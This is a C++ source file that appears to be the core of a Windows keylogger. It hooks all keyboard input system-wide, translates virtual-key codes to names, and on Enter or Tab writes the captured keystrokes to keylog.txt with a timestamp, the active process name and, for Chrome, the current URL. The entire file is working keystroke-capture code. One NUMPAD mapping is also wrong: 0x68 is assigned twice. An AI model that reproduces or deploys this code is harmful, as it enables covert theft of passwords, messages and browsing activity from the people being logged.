#include <map>
#include "keyboard.h"
#include "../url/url.h"

std::string int_to_hex(int n)
{
    std::ostringstream ss;
    ss << std::hex << n;
    return ss.str();
}

std::map<UINT, std::string> createKeyboardMap()
{
    std::string keystring;
    std::map<UINT, std::string> _keyboardMap;
    char keybuffer;
    for (int i = 0; i < 256; ++i)
    {
        keystring = "";
        if (keybuffer = MapVirtualKey(UINT(i), 2))
        {
            keystring += keybuffer;
        }
        else
        {
            keystring = int_to_hex(i);
        }
        _keyboardMap.insert(_keyboardMap.end(), std::pair<UINT, std::string>(UINT(i), keystring));
    }

    _keyboardMap[0x1B] = "ESCAPE";
    _keyboardMap[0x70] = "F1";
    _keyboardMap[0x71] = "F2";
    _keyboardMap[0x72] = "F3";
    _keyboardMap[0x73] = "F4";
    _keyboardMap[0x74] = "F5";
    _keyboardMap[0x75] = "F6";
    _keyboardMap[0x76] = "F7";
    _keyboardMap[0x77] = "F8";
    _keyboardMap[0x78] = "F9";
    _keyboardMap[0x79] = "F10";
    _keyboardMap[0x7A] = "F11";
    _keyboardMap[0x7B] = "F12";
    _keyboardMap[0x2C] = "PRINT SCREEN";
    _keyboardMap[0x91] = "SCROLL LOCK";
    _keyboardMap[0x08] = "BACKSPACE";
    _keyboardMap[0x20] = "SPACE";
    _keyboardMap[0x2D] = "INSERT";
    _keyboardMap[0x24] = "HOME";
    _keyboardMap[0x22] = "PAGE DOWN";
    _keyboardMap[0x21] = "PAGE UP";
    _keyboardMap[0x2E] = "DELETE";
    _keyboardMap[0x90] = "NUMLOCK";
    _keyboardMap[0x6F] = "NUMPAD /";
    _keyboardMap[0x6A] = "NUMPAD *";
    _keyboardMap[0x6D] = "NUMPAD -";
    _keyboardMap[0x6B] = "NUMPAD +";
    _keyboardMap[0x6E] = "NUMPAD .";
    _keyboardMap[0x60] = "NUMPAD 0";
    _keyboardMap[0x61] = "NUMPAD 1";
    _keyboardMap[0x62] = "NUMPAD 2";
    _keyboardMap[0x63] = "NUMPAD 3";
    _keyboardMap[0x64] = "NUMPAD 4";
    _keyboardMap[0x65] = "NUMPAD 5";
    _keyboardMap[0x66] = "NUMPAD 6";
    _keyboardMap[0x67] = "NUMPAD 7";
    _keyboardMap[0x68] = "NUMPAD 8";
    _keyboardMap[0x68] = "NUMPAD 9";

    _keyboardMap[0x26] = "ARROW UP";
    _keyboardMap[0x28] = "ARROW DOWN";
    _keyboardMap[0x25] = "ARROW LEFT";
    _keyboardMap[0x27] = "ARROW RIGHT";

    _keyboardMap[0x0D] = "ENTER";
    _keyboardMap[0xA0] = "LSHIFT";
    _keyboardMap[0xA1] = "RSHIFT";
    _keyboardMap[0x09] = "TAB";
    _keyboardMap[0x14] = "CAPS LOCK";
    _keyboardMap[0xA2] = "LCONTROL";
    _keyboardMap[0xA3] = "RCONTROL";
    _keyboardMap[0xA4] = "LALT";
    _keyboardMap[0xA5] = "RALT";
    _keyboardMap[0x5B] = "LWIN";
    _keyboardMap[0x5C] = "RWIN";

    return _keyboardMap;
}

HHOOK keyboardHook;
std::map<UINT, std::string> keyboardMap = createKeyboardMap();

std::vector<std::string> keyBuffer;

void flush()
{
    std::ofstream myfile("keylog.txt");
    if (myfile.is_open())
    {
        std::time_t logTime = system_clock::to_time_t(system_clock::now());
        myfile << std::ctime(&logTime) << "\n";

        std::string procName = getProcName(getCurrentPID());
        myfile << procName << ": ";

        for (int i = 0; i < keyBuffer.size(); i++)
        {
            myfile << keyBuffer.at(i) << ' ';
            if (i == keyBuffer.size() - 1)
            {
                myfile << '\n';
            }
        }

        if (procName == "chrome.exe")
        {
            std::string url{};
            getChromeUrl(url);
            myfile << "URL > " << url << '\n';
        }

        myfile << '\n';

        myfile.flush();
        myfile.close();
    }
    else
    {
        throw std::runtime_error("Failed to open file");
    }

    keyBuffer.clear();
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
    {
        KBDLLHOOKSTRUCT *pKeyStruct = (KBDLLHOOKSTRUCT *)lParam;

        keyBuffer.push_back(keyboardMap[pKeyStruct->vkCode]);
        if ((pKeyStruct->vkCode == '\n' || pKeyStruct->vkCode == '\t' || pKeyStruct->vkCode == '\r') && keyBuffer.size() > 0)
        {
            keyBuffer.pop_back();
            flush();
        }
        else if (pKeyStruct->vkCode == 0x1B)
        {
            exit(0);
        }
    }

    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

void hookKeyboard()
{
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), NULL);
}

void unhookKeyboard()
{
    UnhookWindowsHookEx(keyboardHook);
}
